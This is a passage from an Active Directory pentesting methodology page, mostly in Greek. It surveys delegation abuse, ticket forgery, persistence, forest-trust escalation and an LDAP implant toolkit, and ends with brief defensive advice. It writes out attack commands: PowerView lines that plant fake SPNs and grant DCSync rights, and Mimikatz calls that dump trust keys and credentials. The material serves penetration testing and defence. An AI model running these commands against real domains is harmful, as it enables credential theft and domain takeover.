Αν ένας χρήστης έχει δικαιώματα να **access MSSQL instances**, μπορεί να **execute commands** στο MSSQL host (αν τρέχει ως SA), να **steal** το NetNTLM **hash** ή ακόμη και να εκτελέσει ένα **relay** **attack**.\
Επίσης, αν ένα MSSQL instance είναι trusted (database link) από ένα διαφορετικό MSSQL instance. Αν ο χρήστης έχει δικαιώματα πάνω στη trusted database, θα μπορεί να **use the trust relationship to execute queries also in the other instance**. Αυτά τα trusts μπορούν να chained και κάποια στιγμή ο χρήστης ίσως βρει μια misconfigured database όπου μπορεί να execute commands.\
**The links between databases work even across forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Third-party inventory and deployment suites often expose powerful paths to credentials and code execution. See:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Αν βρεις οποιοδήποτε Computer object με το attribute [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) και έχεις domain privileges στο computer, θα μπορείς να dump TGTs από memory κάθε χρήστη που κάνει login στο computer.\
Άρα, αν ένας **Domain Admin logins onto the computer**, θα μπορείς να dump το TGT του και να τον impersonate χρησιμοποιώντας [Pass the Ticket](pass-the-ticket.md).\
Χάρη στο constrained delegation θα μπορούσες ακόμη και να **compromise automatically a Print Server** (ελπίζουμε να είναι DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Αν ένας χρήστης ή computer επιτρέπεται για "Constrained Delegation", θα μπορεί να **impersonate any user to access some services in a computer**.\
Τότε, αν **compromise the hash** αυτού του χρήστη/computer θα μπορείς να **impersonate any user** (ακόμη και domain admins) για να access some services.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Έχοντας δικαίωμα **WRITE** πάνω σε ένα Active Directory object ενός remote computer, επιτυγχάνεται code execution με **elevated privileges**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Ο compromised user θα μπορούσε να έχει κάποια **interesting privileges over some domain objects** που θα μπορούσαν να σου επιτρέψουν να **move** laterally/**escalate** privileges.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Η ανακάλυψη ενός **Spool service listening** μέσα στο domain μπορεί να **abused** ώστε να **acquire new credentials** και να **escalate privileges**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Αν **other users** **access** το **compromised** machine, είναι δυνατό να **gather credentials from memory** και ακόμη και να **inject beacons in their processes** για να τους impersonate.\
Συνήθως οι χρήστες θα access το σύστημα μέσω RDP, οπότε εδώ έχεις πώς να κάνεις μερικές επιθέσεις πάνω σε third party RDP sessions:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

Το **LAPS** παρέχει ένα σύστημα για τη διαχείριση του **local Administrator password** σε domain-joined computers, εξασφαλίζοντας ότι είναι **randomized**, μοναδικό και αλλάζει συχνά. Αυτοί οι κωδικοί αποθηκεύονται στο Active Directory και η πρόσβαση ελέγχεται μέσω ACLs μόνο για εξουσιοδοτημένους χρήστες. Με επαρκή δικαιώματα για πρόσβαση σε αυτούς τους κωδικούς, γίνεται δυνατό το pivoting σε άλλα computers.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

Το **Gathering certificates** από το compromised machine θα μπορούσε να είναι ένας τρόπος για να escalate privileges μέσα στο environment:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Αν υπάρχουν ρυθμισμένα **vulnerable templates**, είναι δυνατό να abused για να escalate privileges:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Μόλις αποκτήσεις δικαιώματα **Domain Admin** ή ακόμη καλύτερα **Enterprise Admin**, μπορείς να **dump** τη **domain database**: _ntds.dit_.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Μερικές από τις τεχνικές που συζητήθηκαν πριν μπορούν να χρησιμοποιηθούν για persistence.\
Για παράδειγμα, θα μπορούσες:

- Να κάνεις users vulnerable στο [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Να κάνεις users vulnerable στο [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Να δώσεις δικαιώματα **DCSync** σε έναν user

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

Το **Silver Ticket attack** δημιουργεί ένα **legitimate Ticket Granting Service (TGS) ticket** για μια συγκεκριμένη υπηρεσία χρησιμοποιώντας το **NTLM hash** (για παράδειγμα, το **hash του PC account**). Αυτή η μέθοδος χρησιμοποιείται για να **access the service privileges**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Ένα **Golden Ticket attack** περιλαμβάνει έναν attacker που αποκτά πρόσβαση στο **NTLM hash του krbtgt account** σε ένα Active Directory (AD) environment. Αυτό το account είναι ειδικό επειδή χρησιμοποιείται για να υπογράφει όλα τα **Ticket Granting Tickets (TGTs)**, τα οποία είναι απαραίτητα για authentication μέσα στο AD network.

Μόλις ο attacker αποκτήσει αυτό το hash, μπορεί να δημιουργήσει **TGTs** για οποιονδήποτε account επιλέξει (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Αυτά είναι σαν golden tickets forged με τρόπο που **bypasses common golden tickets detection mechanisms.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Έχοντας certificates ενός account ή όντας σε θέση να τα request** είναι ένας πολύ καλός τρόπος για να μπορείς να persist στον users account (ακόμη κι αν αλλάξει το password):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Η χρήση certificates είναι επίσης δυνατή για persistence με υψηλά privileges μέσα στο domain:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Το object **AdminSDHolder** στο Active Directory διασφαλίζει την ασφάλεια των **privileged groups** (όπως Domain Admins και Enterprise Admins) εφαρμόζοντας ένα τυπικό **Access Control List (ACL)** σε αυτά τα groups για να αποτρέψει unauthorized changes. Ωστόσο, αυτή η δυνατότητα μπορεί να abused· αν ένας attacker τροποποιήσει το ACL του AdminSDHolder ώστε να δώσει πλήρη πρόσβαση σε έναν κανονικό user, αυτός ο user αποκτά εκτεταμένο έλεγχο σε όλα τα privileged groups. Αυτό το security measure, που προορίζεται για προστασία, μπορεί έτσι να γυρίσει μπούμερανγκ, επιτρέποντας unwarranted access αν δεν παρακολουθείται στενά.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Μέσα σε κάθε **Domain Controller (DC)** υπάρχει ένας λογαριασμός **local administrator**. Αφού αποκτήσεις admin rights σε ένα τέτοιο machine, το local Administrator hash μπορεί να εξαχθεί χρησιμοποιώντας **mimikatz**. Στη συνέχεια, απαιτείται μια τροποποίηση του registry για να **enable the use of this password**, επιτρέποντας remote access στον local Administrator account.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Θα μπορούσες να **give** κάποια **special permissions** σε έναν **user** πάνω σε ορισμένα συγκεκριμένα domain objects, κάτι που θα επιτρέψει στον user να **escalate privileges in the future**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

Τα **security descriptors** χρησιμοποιούνται για να **store** τα **permissions** που έχει ένα **object** **over** ένα **object**. Αν μπορείς απλώς να **make** μια **little change** στο **security descriptor** ενός object, μπορείς να αποκτήσεις πολύ ενδιαφέροντα privileges πάνω σε αυτό το object χωρίς να χρειάζεται να είσαι μέλος ενός privileged group.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Abuse την `dynamicObject` auxiliary class για να δημιουργήσεις short-lived principals/GPOs/DNS records με `entryTTL`/`msDS-Entry-Time-To-Die`; αυτοκαταστρέφονται χωρίς tombstones, σβήνοντας LDAP evidence ενώ αφήνουν orphan SIDs, broken `gPLink` references, ή cached DNS responses (π.χ. AdminSDHolder ACE pollution ή malicious `gPCFileSysPath`/AD-integrated DNS redirects).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Τροποποίησε το **LSASS** in memory για να εγκαθιδρύσεις ένα **universal password**, δίνοντας πρόσβαση σε όλους τους domain accounts.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Μάθε τι είναι ένα SSP (Security Support Provider) εδώ.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Μπορείς να δημιουργήσεις το δικό σου **SSP** για να **capture** σε **clear text** τα **credentials** που χρησιμοποιούνται για την πρόσβαση στο machine.


{{#ref}}
custom-ssp.md
{{endref}}

### DCShadow

Καταχωρεί ένα **new Domain Controller** στο AD και το χρησιμοποιεί για να **push attributes** (SIDHistory, SPNs...) σε καθορισμένα objects **without** να αφήνει κανένα **logs** σχετικά με τις **modifications**. Χρειάζεσαι δικαιώματα **DA** και να βρίσκεσαι μέσα στο **root domain**.\
Σημείωσε ότι αν χρησιμοποιήσεις λάθος data, θα εμφανιστούν πολύ άσχημα logs.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Προηγουμένως συζητήσαμε πώς να escalate privileges αν έχεις **enough permission to read LAPS passwords**. Ωστόσο, αυτοί οι κωδικοί μπορούν επίσης να χρησιμοποιηθούν για να **maintain persistence**.\
Δες:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Η Microsoft βλέπει το **Forest** ως το security boundary. Αυτό σημαίνει ότι το **compromising a single domain could potentially lead to the entire Forest being compromised**.

### Basic Information

Ένα [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) είναι ένας μηχανισμός ασφάλειας που επιτρέπει σε έναν user από ένα **domain** να access resources σε ένα άλλο **domain**. Ουσιαστικά δημιουργεί μια σύνδεση ανάμεσα στα authentication systems των δύο domains, επιτρέποντας να ρέουν ομαλά οι authentication verifications. Όταν τα domains στήνουν ένα trust, ανταλλάσσουν και διατηρούν συγκεκριμένα **keys** μέσα στους **Domain Controllers (DCs)** τους, τα οποία είναι κρίσιμα για την ακεραιότητα του trust.

Σε ένα τυπικό σενάριο, αν ένας user θέλει να access μια service σε ένα **trusted domain**, πρέπει πρώτα να ζητήσει ένα ειδικό ticket γνωστό ως **inter-realm TGT** από το DC του δικού του domain. Αυτό το TGT κρυπτογραφείται με ένα κοινό **key** που έχουν συμφωνήσει και τα δύο domains. Έπειτα ο user παρουσιάζει αυτό το TGT στο **DC του trusted domain** για να πάρει ένα service ticket (**TGS**). Μετά την επιτυχή επικύρωση του inter-realm TGT από το DC του trusted domain, εκδίδεται ένα TGS, δίνοντας πρόσβαση του user στη service.

**Steps**:

1. Ένας **client computer** στο **Domain 1** ξεκινά τη διαδικασία χρησιμοποιώντας το **NTLM hash** του για να ζητήσει ένα **Ticket Granting Ticket (TGT)** από το **Domain Controller (DC1)** του.
2. Το DC1 εκδίδει ένα νέο TGT αν ο client authenticated successfully.
3. Ο client στη συνέχεια ζητά ένα **inter-realm TGT** από το DC1, το οποίο χρειάζεται για να access resources στο **Domain 2**.
4. Το inter-realm TGT κρυπτογραφείται με ένα **trust key** που μοιράζονται τα DC1 και DC2 ως μέρος του two-way domain trust.
5. Ο client παίρνει το inter-realm TGT στο **Domain 2's Domain Controller (DC2)**.
6. Το DC2 επαληθεύει το inter-realm TGT χρησιμοποιώντας το shared trust key του και, αν είναι valid, εκδίδει ένα **Ticket Granting Service (TGS)** για τον server στο Domain 2 που θέλει να access ο client.
7. Τέλος, ο client παρουσιάζει αυτό το TGS στον server, το οποίο είναι κρυπτογραφημένο με το hash του account του server, για να πάρει πρόσβαση στη service στο Domain 2.

### Different trusts

Είναι σημαντικό να σημειωθεί ότι **ένα trust μπορεί να είναι 1 way ή 2 ways**. Στις 2 ways επιλογές, και τα δύο domains θα trust το ένα το άλλο, αλλά στη σχέση trust **1 way** ένα από τα domains θα είναι το **trusted** και το άλλο το **trusting** domain. Στην τελευταία περίπτωση, **θα μπορείς να access resources μέσα στο trusting domain μόνο από το trusted one**.

Αν το Domain A trusts το Domain B, το A είναι το trusting domain και το B το trusted one. Επιπλέον, στο **Domain A**, αυτό θα ήταν ένα **Outbound trust**· και στο **Domain B**, αυτό θα ήταν ένα **Inbound trust**.

**Different trusting relationships**

- **Parent-Child Trusts**: Αυτό είναι ένα συνηθισμένο setup μέσα στο ίδιο forest, όπου ένα child domain έχει αυτόματα ένα two-way transitive trust με το parent domain του. Ουσιαστικά, αυτό σημαίνει ότι τα authentication requests μπορούν να ρέουν ομαλά μεταξύ του parent και του child.
- **Cross-link Trusts**: Αναφέρονται ως "shortcut trusts", και δημιουργούνται μεταξύ child domains για να επιταχύνουν referral processes. Σε σύνθετα forests, τα authentication referrals συνήθως πρέπει να ταξιδεύουν μέχρι το forest root και μετά προς τα κάτω στο target domain. Με τη δημιουργία cross-links, η διαδρομή συντομεύει, κάτι που είναι ιδιαίτερα χρήσιμο σε γεωγραφικά διασκορπισμένα περιβάλλοντα.
- **External Trusts**: Αυτά στήνονται μεταξύ διαφορετικών, άσχετων domains και είναι non-transitive από τη φύση τους. Σύμφωνα με την [Microsoft's documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), τα external trusts είναι χρήσιμα για accessing resources σε ένα domain έξω από το current forest που δεν συνδέεται μέσω forest trust. Η ασφάλεια ενισχύεται μέσω SID filtering με external trusts.
- **Tree-root Trusts**: Αυτά τα trusts δημιουργούνται αυτόματα μεταξύ του forest root domain και ενός νέου tree root που προστέθηκε. Παρότι δεν συναντώνται συχνά, τα tree-root trusts είναι σημαντικά για την προσθήκη νέων domain trees σε ένα forest, επιτρέποντάς τους να διατηρούν ένα μοναδικό domain name και εξασφαλίζοντας two-way transitivity. Περισσότερες πληροφορίες υπάρχουν στον [Microsoft's guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Αυτός ο τύπος trust είναι ένα two-way transitive trust μεταξύ δύο forest root domains, εφαρμόζοντας επίσης SID filtering για να ενισχύσει τα security measures.
- **MIT Trusts**: Αυτά τα trusts δημιουργούνται με non-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domains. Τα MIT trusts είναι λίγο πιο εξειδικευμένα και απευθύνονται σε περιβάλλοντα που χρειάζονται integration με Kerberos-based systems εκτός του Windows ecosystem.

#### Other differences in **trusting relationships**

- Μια trust relationship μπορεί επίσης να είναι **transitive** (A trust B, B trust C, τότε A trust C) ή **non-transitive**.
- Μια trust relationship μπορεί να στηθεί ως **bidirectional trust** (και οι δύο trust each other) ή ως **one-way trust** (μόνο ο ένας trust τον άλλον).

### Attack Path

1. **Enumerate** τις trusting relationships
2. Έλεγξε αν κάποιο **security principal** (user/group/computer) έχει **access** σε resources του **other domain**, ίσως μέσω ACE entries ή επειδή είναι σε groups του άλλου domain. Ψάξε για **relationships across domains** (το trust δημιουργήθηκε μάλλον για αυτό).
1. kerberoast σε αυτή την περίπτωση θα μπορούσε να είναι άλλη μια επιλογή.
3. **Compromise** τα **accounts** που μπορούν να **pivot** μέσω domains.

Οι attackers με θα μπορούσαν να access resources σε άλλο domain μέσω τριών βασικών μηχανισμών:

- **Local Group Membership**: Principals μπορεί να προστεθούν σε local groups σε machines, όπως το “Administrators” group σε έναν server, δίνοντάς τους σημαντικό έλεγχο πάνω σε εκείνο το machine.
- **Foreign Domain Group Membership**: Principals μπορούν επίσης να είναι μέλη ομάδων μέσα στο foreign domain. Ωστόσο, η αποτελεσματικότητα αυτής της μεθόδου εξαρτάται από τη φύση του trust και το scope της ομάδας.
- **Access Control Lists (ACLs)**: Principals μπορεί να καθορίζονται σε ένα **ACL**, ιδιαίτερα ως entities σε **ACEs** μέσα σε ένα **DACL**, παρέχοντάς τους πρόσβαση σε συγκεκριμένους resources. Για όσους θέλουν να εμβαθύνουν στους μηχανισμούς των ACLs, DACLs και ACEs, το whitepaper με τίτλο “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” είναι ένας ανεκτίμητος πόρος.

### Find external users/groups with permissions

Μπορείς να ελέγξεις το **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** για να βρεις foreign security principals στο domain. Αυτοί θα είναι user/group από **an external domain/forest**.

Μπορείς να το ελέγξεις αυτό στο **Bloodhound** ή χρησιμοποιώντας powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Εξέλιξη προνομίων από Child σε Parent forest
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Άλλοι τρόποι για να enumerate domain trusts:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Υπάρχουν **2 trusted keys**, μία για _Child --> Parent_ και άλλη μία για _Parent_ --> _Child_.\
> Μπορείς να χρησιμοποιήσεις αυτή που χρησιμοποιείται από το τρέχον domain με:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escalate as Enterprise admin στο child/parent domain abusing το trust με SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Η κατανόηση του Configuration Naming Context (NC) είναι κρίσιμη. Το Configuration NC λειτουργεί ως κεντρικό αποθετήριο για configuration data σε όλο το forest σε Active Directory (AD) environments. Αυτά τα δεδομένα αντιγράφονται σε κάθε Domain Controller (DC) μέσα στο forest, με τα writable DCs να διατηρούν writable copy του Configuration NC. Για να το εκμεταλλευτεί κανείς, πρέπει να έχει **SYSTEM privileges on a DC**, κατά προτίμηση σε child DC.

**Link GPO to root DC site**

Το Configuration NC's Sites container περιέχει information για όλα τα sites των domain-joined computers μέσα στο AD forest. Λειτουργώντας με SYSTEM privileges σε οποιοδήποτε DC, οι attackers μπορούν να κάνουν link GPOs στα root DC sites. Αυτή η ενέργεια μπορεί δυνητικά να compromise το root domain χειραγωγώντας policies που εφαρμόζονται σε αυτά τα sites.

Για αναλυτικές πληροφορίες, μπορεί κανείς να εξερευνήσει research στο [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Ένα attack vector περιλαμβάνει targeting privileged gMSAs within the domain. Το KDS Root key, απαραίτητο για τον υπολογισμό των passwords των gMSAs, αποθηκεύεται μέσα στο Configuration NC. Με SYSTEM privileges on any DC, είναι δυνατό να access το KDS Root key και να compute τα passwords για οποιοδήποτε gMSA σε όλο το forest.

Detailed analysis και step-by-step guidance μπορεί να βρεθεί στο:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Complementary delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Additional external research: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Αυτή η μέθοδος απαιτεί υπομονή, περιμένοντας τη δημιουργία νέων privileged AD objects. Με SYSTEM privileges, ένας attacker μπορεί να modify το AD Schema ώστε να grant σε οποιονδήποτε user complete control over all classes. Αυτό θα μπορούσε να οδηγήσει σε unauthorized access και control over newly created AD objects.

Περαιτέρω ανάγνωση είναι διαθέσιμη στο [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

Το ADCS ESC5 vulnerability στοχεύει τον έλεγχο over Public Key Infrastructure (PKI) objects για να δημιουργήσει ένα certificate template που επιτρέπει authentication as any user within the forest. Εφόσον τα PKI objects βρίσκονται στο Configuration NC, το compromise ενός writable child DC επιτρέπει την εκτέλεση ESC5 attacks.

Περισσότερες λεπτομέρειες μπορούν να διαβαστούν στο [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). Σε σενάρια χωρίς ADCS, ο attacker έχει τη δυνατότητα να στήσει τα απαραίτητα components, όπως συζητείται στο [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
Σε αυτό το σενάριο **το domain σας είναι trusted** από ένα εξωτερικό, δίνοντάς σας **ακαθόριστα permissions** πάνω σε αυτό. Θα χρειαστεί να βρείτε **ποιοι principals του domain σας έχουν ποια access πάνω στο εξωτερικό domain** και στη συνέχεια να προσπαθήσετε να το εκμεταλλευτείτε:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### External Forest Domain - One-Way (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
Σε αυτό το σενάριο **το domain σας** **εκχωρεί** ορισμένα **privileges** σε principal από **διαφορετικά domains**.

Ωστόσο, όταν ένα **domain is trusted** από το trusting domain, το trusted domain **δημιουργεί έναν user** με ένα **predictable name** που χρησιμοποιεί ως **password το trusted password**. Αυτό σημαίνει ότι είναι δυνατό να **access a user from the trusting domain to get inside the trusted one** ώστε να το enumerate και να προσπαθήσετε να escalate περισσότερα privileges:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Ένας άλλος τρόπος να compromise το trusted domain είναι να βρείτε ένα [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) που δημιουργήθηκε στην **αντίθετη κατεύθυνση** του domain trust (κάτι που δεν είναι πολύ συνηθισμένο).

Ένας άλλος τρόπος να compromise το trusted domain είναι να περιμένετε σε ένα machine όπου ένας **user from the trusted domain can access** να κάνει login μέσω **RDP**. Τότε, ο attacker θα μπορούσε να inject code στο RDP session process και να **access the origin domain of the victim** από εκεί.\
Επιπλέον, αν το **victim mounted his hard drive**, από το **RDP session** process ο attacker θα μπορούσε να αποθηκεύσει **backdoors** στο **startup folder of the hard drive**. Αυτή η technique ονομάζεται **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust abuse mitigation

### **SID Filtering:**

- Ο κίνδυνος attacks που αξιοποιούν το SID history attribute across forest trusts μετριάζεται από το SID Filtering, το οποίο είναι ενεργοποιημένο by default σε όλα τα inter-forest trusts. Αυτό βασίζεται στην υπόθεση ότι τα intra-forest trusts είναι secure, θεωρώντας το forest, και όχι το domain, ως το security boundary σύμφωνα με τη θέση της Microsoft.
- Ωστόσο, υπάρχει μια παγίδα: το SID filtering μπορεί να διαταράξει applications και user access, οδηγώντας σε περιστασιακή απενεργοποίησή του.

### **Selective Authentication:**

- Για inter-forest trusts, η χρήση Selective Authentication διασφαλίζει ότι οι users από τα δύο forests δεν authenticated αυτόματα. Αντίθετα, απαιτούνται explicit permissions για να μπορούν οι users να access domains και servers μέσα στο trusting domain ή forest.
- Είναι σημαντικό να σημειωθεί ότι αυτά τα μέτρα δεν προστατεύουν από την exploitation του writable Configuration Naming Context (NC) ή από attacks στον trust account.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

Η [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) επανυλοποιεί bloodyAD-style LDAP primitives ως x64 Beacon Object Files που εκτελούνται εξ ολοκλήρου μέσα σε ένα on-host implant (π.χ. Adaptix C2). Οι operators κάνουν compile το pack με `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, φορτώνουν το `ldap.axs`, και μετά καλούν `ldap <subcommand>` από το beacon. Όλη η traffic περνάει από το τρέχον logon security context μέσω LDAP (389) με signing/sealing ή LDAPS (636) με auto certificate trust, οπότε δεν απαιτούνται socks proxies ή disk artifacts.

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, και `get-groupmembers` επιλύουν short names/OU paths σε πλήρη DNs και κάνουν dump τα αντίστοιχα objects.
- `get-object`, `get-attribute`, και `get-domaininfo` αντλούν arbitrary attributes (συμπεριλαμβανομένων security descriptors) μαζί με τα forest/domain metadata από το `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, και `get-rbcd` αποκαλύπτουν roasting candidates, delegation settings, και υπάρχοντα [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptors απευθείας από LDAP.
- `get-acl` και `get-writable --detailed` αναλύουν το DACL για να παραθέσουν trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes), και inheritance, δίνοντας άμεσα targets για ACL privilege escalation.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives για escalation & persistence

- Τα Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) επιτρέπουν στον operator να στήσει νέα principals ή machine accounts όπου υπάρχουν OU rights. Τα `add-groupmember`, `set-password`, `add-attribute`, και `set-attribute` hijack-άρουν άμεσα targets μόλις βρεθούν write-property rights.
- ACL-focused commands όπως `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, και `add-dcsync` μετατρέπουν WriteDACL/WriteOwner σε οποιοδήποτε AD object σε password resets, group membership control, ή DCSync replication privileges χωρίς να αφήνουν PowerShell/ADSI artifacts. Τα `remove-*` αντίστοιχα καθαρίζουν injected ACEs.

### Delegation, roasting, και Kerberos abuse

- Τα `add-spn`/`set-spn` κάνουν αμέσως έναν compromised user Kerberoastable; το `add-asreproastable` (UAC toggle) το σημαδεύει για AS-REP roasting χωρίς να αγγίξει το password.
- Delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) ξαναγράφουν τα `msDS-AllowedToDelegateTo`, UAC flags, ή `msDS-AllowedToActOnBehalfOfOtherIdentity` από το beacon, ενεργοποιώντας constrained/unconstrained/RBCD attack paths και εξαλείφοντας την ανάγκη για remote PowerShell ή RSAT.

### sidHistory injection, OU relocation, και attack surface shaping

- Το `add-sidhistory` inject-άρει privileged SIDs στο SID history ενός controlled principal (δες [SID-History Injection](sid-history-injection.md)), παρέχοντας stealthy access inheritance πλήρως over LDAP/LDAPS.
- Το `move-object` αλλάζει το DN/OU των computers ή users, επιτρέποντας σε έναν attacker να σύρει assets σε OUs όπου delegated rights ήδη υπάρχουν πριν εκμεταλλευτεί τα `set-password`, `add-groupmember`, ή `add-spn`.
- Τα στενά scoped removal commands (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, κ.λπ.) επιτρέπουν γρήγορο rollback αφού ο operator συλλέξει credentials ή persistence, ελαχιστοποιώντας το telemetry.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Μάθε περισσότερα για το πώς να προστατεύεις credentials εδώ.**](../stealing-credentials/credentials-protections.md)

### **Defensive Measures for Credential Protection**

- **Domain Admins Restrictions**: Συνιστάται οι Domain Admins να επιτρέπεται να κάνουν login μόνο σε Domain Controllers, αποφεύγοντας τη χρήση τους σε άλλους hosts.
- **Service Account Privileges**: Τα services δεν πρέπει να τρέχουν με Domain Admin (DA) privileges για να διατηρείται η ασφάλεια.
- **Temporal Privilege Limitation**: Για εργασίες που απαιτούν DA privileges, η διάρκειά τους πρέπει να περιορίζεται. Αυτό μπορεί να επιτευχθεί με: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
